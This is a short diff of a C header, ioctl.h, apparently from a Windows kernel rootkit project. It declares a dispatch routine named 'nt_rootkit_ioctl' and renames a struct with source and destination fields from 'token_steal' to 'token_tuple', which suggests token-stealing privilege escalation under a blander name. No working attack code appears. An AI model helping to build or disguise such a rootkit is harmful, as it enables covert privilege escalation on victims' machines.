@@ -1,7 +1,7 @@
 /*
  * ioctl.h
  *
- * Description: Defines IRP and driver object controls.
+ * Description: Defines custom IRP and driver object controls.
  */
 
 #ifndef _IOCTL_H_
@@ -19,7 +19,7 @@
 typedef struct {
         ULONG src;
         ULONG dest;
-} token_steal;
+} token_tuple;
 
 DRIVER_DISPATCH nt_rootkit_ioctl;
 
